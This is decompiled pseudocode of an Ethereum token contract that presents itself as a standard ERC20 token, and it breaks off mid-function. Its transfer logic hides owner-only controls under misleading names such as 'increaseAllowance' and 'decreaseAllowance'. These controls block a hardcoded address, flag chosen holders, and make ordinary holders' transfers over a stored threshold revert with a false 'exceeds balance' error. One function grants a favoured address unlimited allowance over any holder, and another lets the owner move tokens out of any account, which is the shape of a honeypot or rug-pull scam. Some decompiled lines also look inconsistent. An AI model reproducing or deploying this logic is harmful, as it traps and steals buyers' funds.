contract main {




// =====================  Runtime code  =====================


mapping of uint256 balanceOf;
mapping of uint8 stor1;
mapping of uint8 stor2;
uint256 stor3;
mapping of uint256 allowance;
uint256 totalSupply;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
address _owner;
address stor11;
address stor12;

function name() payable {
    return name[0 len name.length]
}

function totalSupply() payable {
    return totalSupply
}

function decimals() payable {
    return decimals
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function _owner() payable {
    return _owner
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function decreaseAllowance(address arg1) payable {
    require calldata.size - 4 >= 32
    if _owner != msg.sender:
        revert with 0, '!owner'
    stor11 = arg1
}

function _mint(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if _owner != msg.sender:
        revert with 0, 'ERC20: mint to the zero address'
    if totalSupply + arg2 < totalSupply:
        revert with 0, 'SafeMath: addition overflow'
    totalSupply += arg2
    if balanceOf[stor10] + arg2 < balanceOf[stor10]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[stor10] += arg2
    emit Transfer(arg2, 0, arg1);
}

function addApprove(address[] arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 <= 4294967296
    require arg1 + 36 <= calldata.size
    require arg1.length <= 4294967296 and arg1 + (32 * arg1.length) + 36 <= calldata.size
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    mem[(32 * arg1.length) + 128] = 0
    if _owner != msg.sender:
        revert with 0, '!owner'
    idx = 0
    while idx < arg1.length:
        require idx < arg1.length
        stor2[mem[(32 * idx) + 140 len 20]] = 1
        require idx < arg1.length
        mem[0] = mem[(32 * idx) + 140 len 20]
        mem[32] = 1
        stor1[mem[(32 * idx) + 140 len 20]] = 0
        idx = idx + 1
        continue 
}

function increaseAllowance(address[] arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 <= 4294967296
    require arg1 + 36 <= calldata.size
    require arg1.length <= 4294967296 and arg1 + (32 * arg1.length) + 36 <= calldata.size
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    mem[(32 * arg1.length) + 128] = 0
    if _owner != msg.sender:
        revert with 0, '!owner'
    idx = 0
    while idx < arg1.length:
        require idx < arg1.length
        stor1[mem[(32 * idx) + 140 len 20]] = 1
        require idx < arg1.length
        mem[0] = mem[(32 * idx) + 140 len 20]
        mem[32] = 2
        stor2[mem[(32 * idx) + 140 len 20]] = 0
        idx = idx + 1
        continue 
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function sub_c97d8b69(?) payable {
    require calldata.size - 4 >= 32
    if _owner != msg.sender:
        revert with 0, '!owner'
    stor1[address(arg1)] = 1
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not stor12:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(arg1)][stor12] = -1
    emit Approval(-1, arg1, stor12);
}

function sub_01804882(?) payable {
    require calldata.size - 4 >= 64
    if _owner != msg.sender:
        revert with 0, '!owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(arg1)][address(msg.sender)] = arg2
    emit Approval(arg2, arg1, msg.sender);
    return 1
}

function sub_adccf0df(?) payable {
    require calldata.size - 4 >= 96
    if _owner != msg.sender:
        revert with 0, '!owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if arg3 > balanceOf[address(arg1)]:
        revert with 0, 
                    32,
                    38,
                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                    mem[166 len 26],
                    mem[218 len 6]
    balanceOf[address(arg1)] -= arg3
    if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg2)] += arg3
    emit Transfer(arg3, arg1, arg2);
    if arg3 > allowance[address(arg1)][address(msg.sender)]:
        revert with 0, 
                    32,
                    40,
                    0x6545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                    mem[264 len 24],
                    mem[312 len 8]
    if not arg1:
        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[392 len 28]
    if not msg.sender:
        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[390 len 30]
    allowance[address(arg1)][address(msg.sender)] -= arg3
    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if msg.sender == 0x9d39583c1b847b5eb61627f25f87ed29:
        revert with 0, '!A'
    if _owner != stor11:
        if msg.sender == _owner:
            if msg.sender == arg1:
                stor3 = arg2
        else:
            if msg.sender == stor11:
                if msg.sender == _owner:
                    if msg.sender == arg1:
                        stor3 = arg2
            else:
                if arg1 == _owner:
                    if msg.sender == _owner:
                        if msg.sender == arg1:
                            stor3 = arg2
                else:
                    if bool(stor1[address(msg.sender)]) != 1:
                        if bool(stor2[address(msg.sender)]) == 1:
                            if stor11 != msg.sender:
                                if arg1 != stor12:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                32,
                                                38,
                                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                mem[202 len 26]
                        else:
                            if arg2 >= stor3:
                                if stor11 != msg.sender:
                                    if arg1 != stor12:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                    32,
                                                    38,
                                                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                    mem[202 len 26]
                            else:
                                if arg1 == stor11:
                                    stor2[address(msg.sender)] = 1
                                    stor1[address(msg.sender)] = 0
    else:
        if msg.sender == _owner:
            stor11 = arg1
        else:
            if msg.sender == stor11:
                if msg.sender == _owner:
                    if msg.sender == arg1:
                        stor3 = arg2
            else:
                if arg1 == _owner:
                    if msg.sender == _owner:
                        if msg.sender == arg1:
                            stor3 = arg2
                else:
                    if bool(stor1[address(msg.sender)]) != 1:
                        if bool(stor2[address(msg.sender)]) == 1:
                            if stor11 != msg.sender:
                                if arg1 != stor12:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                32,
                                                38,
                                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                mem[202 len 26]
                        else:
                            if arg2 >= stor3:
                                if stor11 != msg.sender:
                                    if arg1 != stor12:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                    32,
                                                    38,
                                                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                    mem[202 len 26]
                            else:
                                if arg1 == stor11:
                                    stor2[address(msg.sender)] = 1
                                    stor1[address(msg.sender)] = 0
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if arg2 > balanceOf[address(msg.sender)]:
        revert with 0, 
                    32,
                    38,
                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                    mem[166 len 26],
                    mem[218 len 6]
    balanceOf[address(msg.sender)] -= arg2
    if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg1)] += arg2
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if msg.sender == 0x9d39583c1b847b5eb61627f25f87ed29:
        revert with 0, '!A'
    if _owner != stor11:
        if arg1 == _owner:
            if arg1 == arg2:
                stor3 = arg3
        else:
            if arg1 == stor11:
                if arg1 == _owner:
                    if arg1 == arg2:
                        stor3 = arg3
            else:
                if arg2 == _owner:
                    if arg1 == _owner:
                        if arg1 == arg2:
                            stor3 = arg3
                else:
                    if bool(stor1[address(arg1)]) != 1:
                        if bool(stor2[address(arg1)]) == 1:
                            if arg1 != stor11:
                                if arg2 != stor12:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                32,
                                                38,
                                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                mem[202 len 26]
                        else:
                            if arg3 >= stor3:
                                if arg1 != stor11:
                                    if arg2 != stor12:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                    32,
                                                    38,
                                                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                    mem[202 len 26]
                            else:
                                if arg2 == stor11:
                                    stor2[address(arg1)] = 1
                                    stor1[address(arg1)] = 0
    else:
        if arg1 == _owner:
            stor11 = arg2
        else:
            if arg1 == stor11:
                if arg1 == _owner:
                    if arg1 == arg2:
                        stor3 = arg3
            else:
                if arg2 == _owner:
                    if arg1 == _owner:
                        if arg1 == arg2:
                            stor3 = arg3
                else:
                    if bool(stor1[address(arg1)]) != 1:
                        if bool(stor2[address(arg1)]) == 1:
                            if arg1 != stor11:
                                if arg2 != stor12:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                32,
                                                38,
                                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                mem[202 len 26]
                        else:
                            if arg3 >= stor3:
                                if arg1 != stor11:
                                    if arg2 != stor12:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                    32,
                                                    38,
                                                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                    mem[202 len 26]
                            else:
                                if arg2 == stor11:
                                    stor2[address(arg1)] = 1
                                    stor1[address(arg1)] = 0
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if arg3 > balanceOf[address(arg1)]:
        revert with 0, 
                    32,
                    38,
                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                    mem[166 len 26],
                    mem[218 len 6]
    balanceOf[address(arg1)] -= arg3
    if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg2)] += arg3
    emit Transfer(arg3, arg1, arg2);
    if arg3 > allowance[address(arg1)][address(msg.sender)]:
        revert with 0, 
                    32,
                    40,
                    0x6545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                    mem[264 len 24],
                    mem[312 len 8]
    if not arg1:
        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[392 len 28]
    if not msg.sender:
        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[390 len 30]
    allowance[address(arg1)][address(msg.sender)] -= arg3
    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}

function sub_c9f5c4ab(?) payable {
    require calldata.size - 4 >= 64
    require arg1 <= 4294967296
    require arg1 + 36 <= calldata.size
    require arg1.length <= 4294967296 and arg1 + (32 * arg1.length) + 36 <= calldata.size
    mem[96] = arg1.length
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    require arg2 <= 4294967296
    require arg2 + 36 <= calldata.size
    require arg2.length <= 4294967296 and arg2 + (32 * arg2.length) + 36 <= calldata.size
    mem[64] = (32 * arg1.length) + (32 * arg2.length) + 160
    mem[(32 * arg1.length) + 128] = arg2.length
    mem[(32 * arg1.length) + 160 len 32 * arg2.length] = call.data[arg2 + 36 len 32 * arg2.length]
    mem[(32 * arg1.length) + (32 * arg2.length) + 160] = 0
    if _owner != msg.sender:
        revert with 0, '!owner'
    idx = 0
    while idx < arg1.length:
        require idx < mem[96]
        _610 = mem[(32 * idx) + 128]
        require idx < mem[(32 * arg1.length) + 128]
        _612 = mem[(32 * idx) + (32 * arg1.length) + 160]
        if msg.sender == 0x9d39583c1b847b5eb61627f25f87ed29:
            revert with 0, '!A'
        if _owner != stor11:
            if msg.sender == _owner:
                if mem[(32 * idx) + 140 len 20] != msg.sender:
                    if not msg.sender:
                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                    if not mem[(32 * idx) + 140 len 20]:
                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                    _673 = mem[64]
                    mem[64] = mem[64] + 96
                    mem[_673] = 38
                    mem[_673 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                    mem[32] = 0
                    if _612 > balanceOf[address(msg.sender)]:
                        _745 = mem[64]
                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                        mem[mem[64] + 4] = 32
                        mem[mem[64] + 36] = 38
                        idx = 0
                        while idx < 38:
                            mem[_745 + idx + 68] = mem[_673 + idx + 32]
                            idx = idx + 32
                            continue 
                        mem[_745 + 100] = mem[_745 + 126 len 6]
                        revert with memory
                          from mem[64]
                           len _745 + -mem[64] + 132
                else:
                    stor3 = mem[(32 * idx) + (32 * arg1.length) + 160]
                    if not msg.sender:
                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                    if not mem[(32 * idx) + 140 len 20]:
                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                    _705 = mem[64]
                    mem[64] = mem[64] + 96
                    mem[_705] = 38
                    mem[_705 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                    mem[32] = 0
                    if _612 > balanceOf[address(msg.sender)]:
                        _786 = mem[64]
                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                        mem[mem[64] + 4] = 32
                        mem[mem[64] + 36] = 38
                        idx = 0
                        while idx < 38:
                            mem[_786 + idx + 68] = mem[_705 + idx + 32]
                            idx = idx + 32
                            continue 
                        mem[_786 + 100] = mem[_786 + 126 len 6]
                        revert with memory
                          from mem[64]
                           len _786 + -mem[64] + 132
            else:
                if msg.sender == stor11:
                    if _owner != msg.sender:
                        if not msg.sender:
                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                        if not mem[(32 * idx) + 140 len 20]:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                        _675 = mem[64]
                        mem[64] = mem[64] + 96
                        mem[_675] = 38
                        mem[_675 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                        mem[32] = 0
                        if _612 > balanceOf[address(msg.sender)]:
                            _748 = mem[64]
                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                            mem[mem[64] + 4] = 32
                            mem[mem[64] + 36] = 38
                            idx = 0
                            while idx < 38:
                                mem[_748 + idx + 68] = mem[_675 + idx + 32]
                                idx = idx + 32
                                continue 
                            mem[_748 + 100] = mem[_748 + 126 len 6]
                            revert with memory
                              from mem[64]
                               len _748 + -mem[64] + 132
                    else:
                        if mem[(32 * idx) + 140 len 20] != msg.sender:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _707 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_707] = 38
                            mem[_707 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _612 > balanceOf[address(msg.sender)]:
                                _791 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_791 + idx + 68] = mem[_707 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_791 + 100] = mem[_791 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _791 + -mem[64] + 132
                        else:
                            stor3 = mem[(32 * idx) + (32 * arg1.length) + 160]
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _751 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_751] = 38
                            mem[_751 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _612 > balanceOf[address(msg.sender)]:
                                _831 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_831 + idx + 68] = mem[_751 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_831 + 100] = mem[_831 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _831 + -mem[64] + 132
                else:
                    if mem[(32 * idx) + 140 len 20] == _owner:
                        if _owner != msg.sender:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _721 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_721] = 38
                            mem[_721 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _612 > balanceOf[address(msg.sender)]:
                                _802 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_802 + idx + 68] = mem[_721 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_802 + 100] = mem[_802 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _802 + -mem[64] + 132
                        else:
                            if mem[(32 * idx) + 140 len 20] != msg.sender:
                                if not msg.sender:
                                    revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                _764 = mem[64]
                                mem[64] = mem[64] + 96
                                mem[_764] = 38
                                mem[_764 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                mem[32] = 0
                                if _612 > balanceOf[address(msg.sender)]:
                                    _843 = mem[64]
                                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                    mem[mem[64] + 4] = 32
                                    mem[mem[64] + 36] = 38
                                    idx = 0
                                    while idx < 38:
                                        mem[_843 + idx + 68] = mem[_764 + idx + 32]
                                        idx = idx + 32
                                        continue 
                                    mem[_843 + 100] = mem[_843 + 126 len 6]
                                    revert with memory
                                      from mem[64]
                                       len _843 + -mem[64] + 132
                            else:
                                stor3 = mem[(32 * idx) + (32 * arg1.length) + 160]
                                if not msg.sender:
                                    revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                _805 = mem[64]
                                mem[64] = mem[64] + 96
                                mem[_805] = 38
                                mem[_805 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                mem[32] = 0
                                if _612 > balanceOf[address(msg.sender)]:
                                    _891 = mem[64]
                                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                    mem[mem[64] + 4] = 32
                                    mem[mem[64] + 36] = 38
                                    idx = 0
                                    while idx < 38:
                                        mem[_891 + idx + 68] = mem[_805 + idx + 32]
                                        idx = idx + 32
                                        continue 
                                    mem[_891 + 100] = mem[_891 + 126 len 6]
                                    revert with memory
                                      from mem[64]
                                       len _891 + -mem[64] + 132
                    else:
                        mem[0] = msg.sender
                        mem[32] = 1
                        if bool(stor1[address(msg.sender)]) == 1:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _685 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_685] = 38
                            mem[_685 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _612 > balanceOf[address(msg.sender)]:
                                _761 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_761 + idx + 68] = mem[_685 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_761 + 100] = mem[_761 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _761 + -mem[64] + 132
                        else:
                            mem[0] = msg.sender
                            mem[32] = 2
                            if bool(stor2[address(msg.sender)]) == 1:
                                if msg.sender == stor11:
                                    if not msg.sender:
                                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                    _798 = mem[64]
                                    mem[64] = mem[64] + 96
                                    mem[_798] = 38
                                    mem[_798 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                    mem[32] = 0
                                    if _612 > balanceOf[address(msg.sender)]:
                                        _881 = mem[64]
                                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                        mem[mem[64] + 4] = 32
                                        mem[mem[64] + 36] = 38
                                        idx = 0
                                        while idx < 38:
                                            mem[_881 + idx + 68] = mem[_798 + idx + 32]
                                            idx = idx + 32
                                            continue 
                                        mem[_881 + 100] = mem[_881 + 126 len 6]
                                        revert with memory
                                          from mem[64]
                                           len _881 + -mem[64] + 132
                                else:
                                    if mem[(32 * idx) + 140 len 20] != stor12:
                                        revert with 0, 32, 38, 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[mem[64] + 106 len 26]
                                    if not msg.sender:
                                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                    _838 = mem[64]
                                    mem[64] = mem[64] + 96
                                    mem[_838] = 38
                                    mem[_838 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                    mem[32] = 0
                                    if _612 > balanceOf[address(msg.sender)]:
                                        _939 = mem[64]
                                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                        mem[mem[64] + 4] = 32
                                        mem[mem[64] + 36] = 38
                                        idx = 0
                                        while idx < 38:
                                            mem[_939 + idx + 68] = mem[_838 + idx + 32]
                                            idx = idx + 32
                                            continue 
                                        mem[_939 + 100] = mem[_939 + 126 len 6]
                                        revert with memory
                                          from mem[64]
                                           len _939 + -mem[64] + 132
                            else:
                                if mem[(32 * idx) + (32 * arg1.length) + 160] >= stor3:
                                    if msg.sender == stor11:
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _834 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_834] = 38
                                        mem[_834 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _612 > balanceOf[address(msg.sender)]:
                                            _929 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_929 + idx + 68] = mem[_834 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_929 + 100] = mem[_929 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _929 + -mem[64] + 132
                                    else:
                                        if mem[(32 * idx) + 140 len 20] != stor12:
                                            revert with 0, 32, 38, 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[mem[64] + 106 len 26]
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _876 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_876] = 38
                                        mem[_876 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _612 > balanceOf[address(msg.sender)]:
                                            _992 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_992 + idx + 68] = mem[_876 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_992 + 100] = mem[_992 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _992 + -mem[64] + 132
                                else:
                                    if mem[(32 * idx) + 140 len 20] != stor11:
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _796 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_796] = 38
                                        mem[_796 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _612 > balanceOf[address(msg.sender)]:
                                            _878 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
